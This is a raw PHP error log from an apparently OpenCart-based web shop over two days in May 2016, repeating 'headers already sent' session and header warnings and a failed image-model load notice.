2016-05-11 7:33:52 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 7:33:52 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 7:33:52 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-11 7:33:52 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 7:33:52 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-11 7:33:56 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 7:33:56 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 7:33:56 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-11 7:33:56 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 7:33:56 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-11 7:39:28 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 7:39:28 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 7:39:28 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-11 7:39:28 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 7:39:28 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-11 7:46:20 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 7:46:20 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 7:46:20 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-11 7:46:20 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 7:46:20 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-11 9:12:56 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 9:12:56 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 9:12:56 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-11 9:12:56 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 9:12:56 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-11 9:25:00 - 
2016-05-11 9:25:00 - 
2016-05-11 9:25:00 - 
2016-05-11 9:25:00 - 
2016-05-11 9:25:00 - 
2016-05-11 9:40:45 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 9:40:45 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 9:40:45 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-11 9:40:45 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 9:40:45 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-11 10:04:07 - 
2016-05-11 10:04:07 - 
2016-05-11 10:04:07 - 
2016-05-11 10:04:07 - 
2016-05-11 10:04:07 - 
2016-05-11 10:43:20 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 10:43:20 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 10:43:20 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-11 10:43:20 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 10:43:20 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-11 11:00:00 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 11:00:00 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 11:00:00 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-11 11:00:00 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 11:00:00 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-11 13:04:38 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 13:04:38 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 13:04:38 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-11 13:04:38 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 13:04:38 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-11 13:25:55 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 13:25:55 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 13:25:55 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-11 13:25:55 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 13:25:55 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-11 15:14:42 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 15:14:42 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 15:14:42 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-11 15:14:42 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 15:14:42 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-11 15:42:00 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 15:42:00 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 15:42:00 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-11 15:42:00 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 15:42:00 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-11 17:01:25 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 17:01:25 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 17:01:25 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-11 17:01:25 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 17:01:25 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-11 17:02:31 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 17:02:31 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 17:02:31 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-11 17:02:31 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 17:02:31 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-11 19:04:59 - 
2016-05-11 19:04:59 - 
2016-05-11 19:04:59 - 
2016-05-11 19:04:59 - 
2016-05-11 19:04:59 - 
2016-05-11 19:06:30 - 
2016-05-11 19:06:30 - 
2016-05-11 19:06:30 - 
2016-05-11 19:06:30 - 
2016-05-11 19:06:30 - 
2016-05-11 19:56:18 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 19:56:18 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 19:56:18 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 20:45:26 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 20:45:26 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 20:45:26 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-11 20:45:26 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 20:45:26 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-11 23:48:51 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 23:48:51 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-11 23:48:51 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-11 23:48:51 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-11 23:48:51 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-12 0:44:20 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 0:44:20 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 0:44:20 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-12 4:20:05 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 4:20:05 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 4:20:05 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-12 4:20:05 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-12 4:20:05 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-12 4:20:22 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 4:20:22 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 4:20:22 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-12 4:20:22 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-12 4:20:22 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-12 4:30:06 - 
2016-05-12 4:30:06 - 
2016-05-12 4:30:06 - 
2016-05-12 4:30:06 - 
2016-05-12 4:30:06 - 
2016-05-12 5:42:44 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 5:42:44 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 5:42:44 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-12 7:12:31 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 7:12:31 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 7:12:31 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-12 7:12:31 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-12 7:12:31 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-12 8:42:26 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 8:42:26 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 8:42:26 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-12 8:42:26 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-12 8:42:26 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-12 9:09:55 - 
2016-05-12 9:09:55 - 
2016-05-12 9:09:55 - 
2016-05-12 9:09:55 - 
2016-05-12 9:09:55 - 
2016-05-12 9:22:45 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 9:22:45 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 9:22:45 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-12 9:22:45 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-12 9:22:45 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-12 9:22:57 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 9:22:57 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 9:22:57 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-12 9:22:57 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-12 9:22:57 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-12 9:52:53 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 9:52:53 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 9:52:53 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-12 9:52:53 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-12 9:52:53 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-12 10:20:18 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 10:20:18 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 10:20:18 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-12 10:43:15 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 10:43:16 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 10:43:16 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_controller.php on line 28
2016-05-12 10:43:16 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_controller.php on line 29
2016-05-12 14:08:17 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 14:08:17 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 14:08:17 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-12 14:08:17 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-12 14:08:17 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-12 14:13:12 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 14:13:12 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 14:13:12 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-12 14:13:12 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-12 14:13:12 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_controller.php on line 28
2016-05-12 14:13:12 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_controller.php on line 29
2016-05-12 14:15:40 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 14:15:40 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 14:15:40 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-12 14:15:40 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-12 14:15:41 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-12 14:15:41 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 14:15:41 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 14:15:41 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-12 14:15:41 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-12 14:15:41 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-12 14:15:41 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 14:15:41 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 14:15:41 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-12 14:15:41 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-12 14:15:41 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-12 14:15:42 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 14:15:42 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 14:15:42 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-12 14:15:42 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-12 14:15:42 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-12 14:20:36 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 14:20:36 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-12 14:20:36 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-12 14:20:36 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
